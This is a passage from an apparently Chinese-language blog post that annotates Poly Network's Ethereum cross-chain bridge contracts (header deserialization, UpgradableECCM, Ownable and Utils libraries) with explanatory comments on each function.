off);</span><br><span class="line"></span><br><span class="line">        TxParam memory txParam;</span><br><span class="line"></span><br><span class="line">        (txParam.txHash, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        (txParam.crossChainId, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        (txParam.fromContract, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        (txParam.toChainId, off) = ZeroCopySource.NextUint64(_valueBs, off);</span><br><span class="line">        (txParam.toContract, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        (txParam.method, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        (txParam.args, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        </span><br><span class="line">        toMerkleValue.makeTxParam = txParam;</span><br><span class="line"></span><br><span class="line">        return toMerkleValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //将对应的bytes形式的rawHeader，解码成对应的Header结构体</span><br><span class="line">    function deserializeHeader(bytes memory _headerBs) internal pure returns (Header memory) &#123;</span><br><span class="line">        Header memory header;</span><br><span class="line">        uint256 off = 0;</span><br><span class="line">        (header.version, off)  = ZeroCopySource.NextUint32(_headerBs, off);</span><br><span class="line">        (header.chainId, off) = ZeroCopySource.NextUint64(_headerBs, off);</span><br><span class="line">        (header.prevBlockHash, off) = ZeroCopySource.NextHash(_headerBs, off);</span><br><span class="line">        (header.transactionsRoot, off) = ZeroCopySource.NextHash(_headerBs, off);</span><br><span class="line">        (header.crossStatesRoot, off) = ZeroCopySource.NextHash(_headerBs, off);</span><br><span class="line">        (header.blockRoot, off) = ZeroCopySource.NextHash(_headerBs, off);</span><br><span class="line">        (header.timestamp, off) = ZeroCopySource.NextUint32(_headerBs, off);</span><br><span class="line">        (header.height, off) = ZeroCopySource.NextUint32(_headerBs, off);</span><br><span class="line">        (header.consensusData, off) = ZeroCopySource.NextUint64(_headerBs, off);</span><br><span class="line">        (header.consensusPayload, off) = ZeroCopySource.NextVarBytes(_headerBs, off);</span><br><span class="line">        (header.nextBookkeeper, off) = ZeroCopySource.NextBytes20(_headerBs, off);</span><br><span class="line">        return header;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice            Deserialize Poly chain block header raw bytes</span><br><span class="line">    *  @param rawHeader   Poly chain block header raw bytes</span><br><span class="line">    *  @return            header hash same as Poly chain</span><br><span class="line">    */</span><br><span class="line">    //得到poly chain上的区块头数据的哈希</span><br><span class="line">    function getHeaderHash(bytes memory rawHeader) internal pure returns (bytes32) &#123;</span><br><span class="line">        return sha256(abi.encodePacked(sha256(rawHeader)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="UpgradableECCM-sol"><a href="#UpgradableECCM-sol" class="headerlink" title="UpgradableECCM.sol"></a><code>UpgradableECCM.sol</code></h4><p>代码github位置：polynetwork/eth-contracts/contracts/core/cross_chain_manager/upgrade/UpgradableECCM.sol</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/upgrade/UpgradableECCM.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/upgrade/UpgradableECCM.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;./../interface/IEthCrossChainData.sol&quot;;</span><br><span class="line">import &quot;./../interface/IUpgradableECCM.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/lifecycle/Pausable.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/ownership/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract UpgradableECCM is IUpgradableECCM, Ownable, Pausable &#123;</span><br><span class="line">    address public EthCrossChainDataAddress;</span><br><span class="line">    uint64 public chainId;  </span><br><span class="line">    </span><br><span class="line">    constructor (address ethCrossChainDataAddr, uint64 _chainId) Pausable() Ownable()  public &#123;</span><br><span class="line">        EthCrossChainDataAddress = ethCrossChainDataAddr;</span><br><span class="line">        chainId = _chainId;</span><br><span class="line">    &#125;</span><br><span class="line">    //初始化部署时，输入对应的CCD合约的地址，和对应的chainID</span><br><span class="line">    </span><br><span class="line">    function pause() onlyOwner public returns (bool) &#123;</span><br><span class="line">        if (!paused()) &#123;</span><br><span class="line">            _pause();</span><br><span class="line">        &#125;</span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        if (!eccd.paused()) &#123;</span><br><span class="line">            require(eccd.pause(), &quot;pause EthCrossChainData contract failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //将该合约和CCD合约，触发为暂停状态</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unpause() onlyOwner public returns (bool) &#123;</span><br><span class="line">        if (paused()) &#123;</span><br><span class="line">            _unpause();</span><br><span class="line">        &#125;</span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        if (eccd.paused()) &#123;</span><br><span class="line">            require(eccd.unpause(), &quot;unpause EthCrossChainData contract failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //将该合约和CCD合约，恢复为正常状态</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // modifier onlyOwner限制只有owner，才能将对应的owner更改为新的CCM合约地址</span><br><span class="line">    function upgradeToNew(address newEthCrossChainManagerAddress) whenPaused onlyOwner public returns (bool) &#123;</span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        eccd.transferOwnership(newEthCrossChainManagerAddress);</span><br><span class="line">        //该函数用于将modifier中的owner更改为新的CCM合约地址</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //更改chainID,modifier onlyOwner限制只有owner才能更改对应的chainID</span><br><span class="line">    function setChainId(uint64 _newChainId) whenPaused onlyOwner public returns (bool) &#123;</span><br><span class="line">        chainId = _newChainId;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="通用智能合约代码分析"><a href="#通用智能合约代码分析" class="headerlink" title="通用智能合约代码分析"></a>通用智能合约代码分析</h2><h4 id="Context-sol："><a href="#Context-sol：" class="headerlink" title="Context.sol："></a><code>Context.sol</code>：</h4><p>提供有关当前执行上下文的信息，包括交易的发送者及交易的数据。</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/libs/GSN/Context.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/libs/GSN/Context.sol</a></p>
<h4 id="Ownable-sol-："><a href="#Ownable-sol-：" class="headerlink" title="Ownable.sol ："></a><code>Ownable.sol</code> ：</h4><p>提供基本访问控制机制的合约模块，如：授权一个账户访问特定的函数功能。</p>
<p>该模块主要通过继承来使用，提供可用的<code>modifier</code> onlyOwner，应用于对应的函数，限制特定的owner来调用。</p>
<p><a href="https://github.com/polynetwork/eth-contracts/tree/master/contracts/libs/ownership">https://github.com/polynetwork/eth-contracts/tree/master/contracts/libs/ownership</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Ownable is Context &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line">    //代表合约所有权的转移</span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        address msgSender = _msgSender();</span><br><span class="line">        _owner = msgSender;</span><br><span class="line">        emit OwnershipTransferred(address(0), msgSender);</span><br><span class="line">    &#125;</span><br><span class="line">    //进行初始化合约，将部署者设置为初始所有者</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line">	//返回当前合约所有者的地址</span><br><span class="line">	</span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    //该modifier用于限制只有所有者账户，才能调用对应的账户</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return _msgSender() == _owner;</span><br><span class="line">    &#125;</span><br><span class="line">	//判断调用者是否为当前的所有者</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line">	//该函数用于将合约的所有者去除，恢复初始状态</span><br><span class="line">	</span><br><span class="line">    function transferOwnership(address newOwner) public  onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line">	//该函数由当前所有者调用，将合约的所有权转移到新账户&#x27;newOwner&#x27;。</span><br><span class="line"> </span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    //将该合约的所有权转移给新账户，emit对应的事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Utils-sol"><a href="#Utils-sol" class="headerlink" title="Utils.sol"></a><code>Utils.sol</code></h4><p>该函数进行一些bytes ,uint，address之间的转换，以及一些merkle proof和verify sig用到的函数</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/libs/utils/Utils.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/libs/utils/Utils.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">library Utils &#123;</span><br><span class="line"></span><br><span class="line">    /* @notice      Convert the bytes array to bytes32 type, the bytes array length must be 32</span><br><span class="line">    *  @param _bs   Source bytes array</span><br><span class="line">    *  @return      bytes32</span><br><span class="line">    */</span><br><span class="line">    //将bytes数组转换为bytes32类型，bytes数组长度必须为32</span><br><span class="line">    function bytesToBytes32(bytes memory _bs) internal pure returns (bytes32 value) &#123;</span><br><span class="line">        require(_bs.length == 32, &quot;bytes length is not 32.&quot;);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // load 32 bytes from memory starting from position _bs + 0x20 since the first 0x20 bytes stores _bs length</span><br><span class="line">            value := mload(add(_bs, 0x20))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice      Convert bytes to uint256</span><br><span class="line">    *  @param _b    Source bytes should have length of 32</span><br><span class="line">    *  @return      uint256</span><br><span class="line">    */</span><br><span class="line">    //将对应的bytes转换为uint256格式</span><br><span class="line">    function bytesToUint256(bytes memory _bs) internal pure returns (uint256 value) &#123;</span><br><span class="line">        require(_bs.length == 32, &quot;bytes length is not 32.&quot;);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // load 32 bytes from memory starting from position _bs + 32</span><br><span class="line">            value := mload(add(_bs, 0x20))</span><br><span class="line">        &#125;</span><br><span class="line">        require(value &lt;= 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, &quot;Value exceeds the range&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice      Convert uint256 to bytes</span><br><span class="line">    *  @param _b    uint256 that needs to be converted</span><br><span class="line">    *  @return      bytes</span><br><span class="line">    */</span><br><span class="line">   // 将uint256转化为bytes格式</span><br><span class="line">    function uint256ToBytes(uint256 _value) internal pure returns (bytes memory bs) &#123;</span><br><span class="line">        require(_value &lt;= 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, &quot;Value exceeds the range&quot;);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // Get a location of some free memory and store it in result as</span><br><span class="line">            // Solidity does for memory variables.</span><br><span class="line">            bs := mload(0x40)</span><br><span class="line">            // Put 0x20 at the first word, the length of bytes for uint256 value</span><br><span class="line">            mstore(bs, 0x20)</span><br><span class="line">            //In the next word, put value in bytes format to the next 32 bytes</span><br><span class="line">            mstore(add(bs, 0x20), _value)</span><br><span class="line">            // Update the free-memory pointer by padding our last write location to 32 bytes</span><br><span class="line">            mstore(0x40, add(bs, 0x40))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice      Convert bytes to address</span><br><span class="line">    *  @param _bs   Source bytes: bytes length must be 20</span><br><span class="line">    *  @return      Converted address from source bytes</span><br><span class="line">    */</span><br><span class="line">    //将bytes转化为对应的地址</span><br><span class="line">    function bytesToAddress(bytes memory _bs) internal pure returns (address addr)</span><br><span class="line">    &#123;</span><br><span class="line">        require(_bs.length == 20, &quot;bytes length does not match address&quot;);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // for _bs, first word store _bs.length, second word store _bs.value</span><br><span class="line">            // load 32 bytes from mem[_bs+20], convert it into Uint160, meaning we take last 20 bytes as addr (address).</span><br><span class="line">            addr := mload(add(_bs, 0x14))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /* @notice      Convert address to bytes</span><br><span class="line">    *  @param _addr Address need to be converted</span><br><span class="line">    *  @return      Converted bytes from address</span><br><span class="line">    */</span><br><span class="line">    //将地址转化为对应的bytes</span><br><span class="line">    function addressToBytes(address _addr) internal pure returns (bytes memory bs)&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // Get a location of some free memory and store it in result as</span><br><span class="line">            // Solidity does for memory variables.</span><br><span class="line">            bs := mload(0x40)</span><br><span class="line">            // Put 20 (address byte length) at the first word, the length of bytes for uint256 value</span><br><span class="line">            mstore(bs, 0x14)</span><br><span class="line">            // logical shift left _a by 12 bytes, change _a from right-aligned to left-aligned</span><br><span class="line">            mstore(add(bs, 0x20), shl(96, _addr))</span><br><span class="line">            // Update the free-memory pointer by padding our last write location to 32 bytes</span><br><span class="line">            mstore(0x40, add(bs, 0x40))</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice          Do hash leaf as the multi-chain does</span><br><span class="line">    *  @param _data     Data in bytes format</span><br><span class="line">    *  @return          Hashed value in bytes32 format</span><br><span class="line">    */</span><br><span class="line">    //计算叶子节点的哈希值</span><br><span class="line">    function hashLeaf(bytes memory _data) internal pure returns (bytes32 result)  &#123;</span><br><span class="line">        result = sha256(abi.encodePacked(byte(0x0), _data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice          Do hash children as the multi-chain does</span><br><span class="line">    *  @param _l        Left node</span><br><span class="line">    *  @param _r        Right node</span><br><span class="line">    *  @return          Hashed value in bytes32 format</span><br><span class="line">    */</span><br><span class="line">    //计算左右节点的哈希</span><br><span class="line">    function hashChildren(bytes32 _l, bytes32  _r) internal pure returns (bytes32 result)  &#123;</span><br><span class="line">        result = sha256(abi.encodePacked(bytes1(0x01), _l, _r));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              Compare if two bytes are equal, which are in storage and memory, seperately</span><br><span class="line">                            Refer from https://github.com/summa-tx/bitcoin-spv/blob/master/solidity/contracts/BytesLib.sol#L368</span><br><span class="line">    *  @param _preBytes     The bytes stored in storage</span><br><span class="line">    *  @param _postBytes    The bytes stored in memory</span><br><span class="line">    *  @return              Bool type indicating if they are equal</span><br><span class="line">    */</span><br><span class="line">    //比较两个bytes类型的数据是否相等</span><br><span class="line">    function equalStorage(bytes storage _preBytes, bytes memory _postBytes) internal view returns (bool) &#123;</span><br><span class="line">        bool success = true;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            // we know _preBytes_offset is 0</span><br><span class="line">            let fslot := sload(_preBytes_slot)</span><br><span class="line">            // Arrays of 31 bytes or less have an even value in their slot,</span><br><span class="line">            // while longer arrays have an odd value. The actual length is</span><br><span class="line">            // the slot divided by two for odd values, and the lowest order</span><br><span class="line">            // byte divided by two for even values.</span><br><span class="line">            // If the slot is even, bitwise and the slot with 255 and divide by</span><br><span class="line">            // two to get the length. If the slot is odd, bitwise and the slot</span><br><span class="line">            // with -1 and divide by two.</span><br><span class="line">            let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)</span><br><span class="line">            let mlength := mload(_postBytes)</span><br><span class="line"></span><br><span class="line">            // if lengths don&#x27;t match the arrays are not equal</span><br><span class="line">            switch eq(slength, mlength)</span><br><span class="line">            case 1 &#123;</span><br><span class="line">                // fslot can contain both the length and contents of the array</span><br><span class="line">                // if slength &lt; 32 bytes so let&#x27;s prepare for that</span><br><span class="line">                // v. http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage</span><br><span class="line">                // slength != 0</span><br><span class="line">                if iszero(iszero(slength)) &#123;</span><br><span class="line">                    switch lt(slength, 32)</span><br><span class="line">                    case 1 &#123;</span><br><span class="line">                        // blank the last byte which is the length</span><br><span class="line">                        fslot := mul(div(fslot, 0x100), 0x100)</span><br><span class="line"></span><br><span class="line">                        if iszero(eq(fslot, mload(add(_postBytes, 0x20)))) &#123;</span><br><span class="line">                            // unsuccess:</span><br><span class="line">                            success := 0</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    default &#123;</span><br><span class="line">                        // cb is a circuit breaker in the for loop since there&#x27;s</span><br><span class="line">                        //  no said feature for inline assembly loops</span><br><span class="line">                        // cb = 1 - don&#x27;t breaker</span><br><span class="line">                        // cb = 0 - break</span><br><span class="line">                        let cb := 1</span><br><span class="line"></span><br><span class="line">                        // get the keccak hash to get the contents of the array</span><br><span class="line">                        mstore(0x0, _preBytes_slot)</span><br><span class="line">                        let sc := keccak256(0x0, 0x20)</span><br><span class="line"></span><br><span class="line">                        let mc := add(_postBytes, 0x20)</span><br><span class="line">                        let end := add(mc, mlength)</span><br><span class="line"></span><br><span class="line">                        // the next line is the loop condition:</span><br><span class="line">                        // while(uint(mc &lt; end) + cb == 2)</span><br><span class="line">                        for &#123;&#125; eq(add(lt(mc, end), cb), 2) &#123;</span><br><span class="line">                            sc := add(sc, 1)</span><br><span class="line">                            mc := add(mc, 0x20)</span><br><span class="line">                        &#125; &#123;</span><br><span class="line">                            if iszero(eq(sload(sc), mload(mc))) &#123;</span><br><span class="line">                                // unsuccess:</span><br><span class="line">                                success := 0</span><br><span class="line">                                cb := 0</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            default &#123;</span><br><span class="line">                // unsuccess:</span><br><span class="line">                success := 0</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return success;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              Slice the _bytes from _start index till the result has length of _length</span><br><span class="line">                            Refer from https://github.com/summa-tx/bitcoin-spv/blob/master/solidity/contracts/BytesLib.sol#L246</span><br><span class="line">    *  @param _bytes        The original bytes needs to be sliced</span><br><span class="line">    *  @param _start        The index of _bytes for the start of sliced bytes</span><br><span class="line">    *  @param _length       The index of _bytes for the end of sliced bytes</span><br><span class="line">    *  @return              The sliced bytes</span><br><span class="line">    */</span><br><span class="line">    //从bytes类型的数据，指定的偏移量分片获得指定长度的bytes数据</span><br><span class="line">    function slice(</span><br><span class="line">        bytes memory _bytes,</span><br><span class="line">        uint _start,</span><br><span class="line">        uint _length</span><br><span class="line">    )</span><br><span class="line">        internal</span><br><span class="line">        pure</span><br><span class="line">        returns (bytes memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(_bytes.length &gt;= (_start + _length));</span><br><span class="line"></span><br><span class="line">        bytes memory tempBytes;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            switch iszero(_length)</span><br><span class="line">            case 0 &#123;</span><br><span class="line">                // Get a location of some free memory and store it in tempBytes as</span><br><span class="line">                // Solidity does for memory variables.</span><br><span class="line">                tempBytes := mload(0x40)</span><br><span class="line"></span><br><span class="line">                // The first word of the slice result is potentially a partial</span><br><span class="line">                // word read from the original array. To read it, we calculate</span><br><span class="line">                // the length of that partial word and start copying that many</span><br><span class="line">                // bytes into the array. The first word we copy will start with</span><br><span class="line">                // data we don&#x27;t care about, but the last `lengthmod` bytes will</span><br><span class="line">                // land at the beginning of the contents of the new array. When</span><br><span class="line">                // we&#x27;re done copying, we overwrite the full first word with</span><br><span class="line">                // the actual length of the slice.</span><br><span class="line">                // lengthmod &lt;= _length % 32</span><br><span class="line">                let lengthmod := and(_length, 31)</span><br><span class="line"></span><br><span class="line">                // The multiplication in the next line is necessary</span><br><span class="line">                // because when slicing multiples of 32 bytes (lengthmod == 0)</span><br><span class="line">                // the following copy loop was copying the origin&#x27;s length</span><br><span class="line">                // and then ending prematurely not copying everything it should.</span><br><span class="line">                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))</span><br><span class="line">                let end := add(mc, _length)</span><br><span class="line"></span><br><span class="line">                for &#123;</span><br><span class="line">                    // The multiplication in the next line has the same exact purpose</span><br><span class="line">                    // as the one above.</span><br><span class="line">                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)</span><br><span class="line">                &#125; lt(mc, end) &#123;</span><br><span class="line">                    mc := add(mc, 0x20)</span><br><span class="line">                    cc := add(cc, 0x20)</span><br><span class="line">                &#125; &#123;</span><br><span class="line">                    mstore(mc, mload(cc))</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mstore(tempBytes, _length)</span><br><span class="line"></span><br><span class="line">                //update free-memory pointer</span><br><span class="line">                //allocating the array padded to 32 bytes like the compiler does now</span><br><span class="line">                mstore(0x40, and(add(mc, 31), not(31)))</span><br><span class="line">            &#125;</span><br><span class="line">            //if we want a zero-length slice let&#x27;s just return a zero-length array</span><br><span class="line">            default &#123;</span><br><span class="line">                tempBytes := mload(0x40)</span><br><span class="line"></span><br><span class="line">                mstore(0x40, add(tempBytes, 0x20))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return tempBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    /* @notice              Check if the elements number of _signers within _keepers array is no less than _m</span><br><span class="line">    *  @param _keepers      The array consists of serveral address</span><br><span class="line">    *  @param _signers      Some specific addresses to be looked into</span><br><span class="line">    *  @param _m            The number requirement paramter</span><br><span class="line">    *  @return              True means containment, false meansdo do not contain.</span><br><span class="line">    */</span><br><span class="line">    //用于验证签名，比较两个签名地址数组之中，是否有m个地址相同</span><br><span class="line">    function containMAddresses(address[] memory _keepers, address[] memory _signers, uint _m) internal pure returns (bool)&#123;</span><br><span class="line">        uint m = 0;</span><br><span class="line">        for(uint i = 0; i &lt; _signers.length; i++)&#123;</span><br><span class="line">            for (uint j = 0; j &lt; _keepers.length; j++) &#123;</span><br><span class="line">                if (_signers[i] == _keepers[j]) &#123;</span><br><span class="line">                    m++;</span><br><span class="line">                    // delete _keepers[j];</span><br><span class="line">                    _keepers[j] = 0x7777777777777777777777777777777777777777;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return m &gt;= _m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              TODO</span><br><span class="line">    *  @param key</span><br><span class="line">    *  @return</span><br><span class="line">    */</span><br><span class="line">    //将对应的公钥进行压缩</span><br><span class="line">    function compressMCPubKey(bytes memory key) internal pure returns (bytes memory newkey) &#123;</span><br><span class="line">         require(key.length &gt;= 67, &quot;key lenggh is too short&quot;);</span><br><span class="line">         newkey = slice(key, 0, 35);</span><br><span class="line">         if (uint8(key[66]) % 2 == 0)&#123;</span><br><span class="line">             newkey[2] = byte(0x02);</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             newkey[2] = byte(0x03);</span><br><span class="line">         &#125;</span><br><span class="line">         return newkey;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns true if `account` is a contract.</span><br><span class="line">     *      Refer from https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L18</span><br><span class="line">     *</span><br><span class="line">     * This test is non-exhaustive, and there may be false-negatives: during the</span><br><span class="line">     * execution of a contract&#x27;s constructor, its address will be reported as</span><br><span class="line">     * not containing a contract.</span><br><span class="line">     *</span><br><span class="line">     * IMPORTANT: It is unsafe to assume that an address for which this</span><br><span class="line">     * function returns false is an externally-owned account (EOA) and not a</span><br><span class="line">     * contract.</span><br><span class="line">     */</span><br><span class="line">     //判断该账户是合约账户还是普通账户</span><br><span class="line">    function isContract(address account) internal view returns (bool) &#123;</span><br><span class="line">        // This method relies in extcodesize, which returns 0 for contracts in</span><br><span class="line">        // construction, since the code is only stored at the end of the</span><br><span class="line">        // constructor execution.</span><br><span class="line"></span><br><span class="line">        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts</span><br><span class="line">        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned</span><br><span class="line">        // for accounts without code, i.e. `keccak256(&#x27;&#x27;)`</span><br><span class="line">        bytes32 codehash;</span><br><span class="line">        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123; codehash := extcodehash(account) &#125;</span><br><span class="line">        return (codehash != 0x0 &amp;&amp; codehash != accountHash);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>智能合约</category>
        <category>以太坊</category>
        <category>跨链桥</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>跨链桥</tag>
      </tags>
  </entry>
</search>
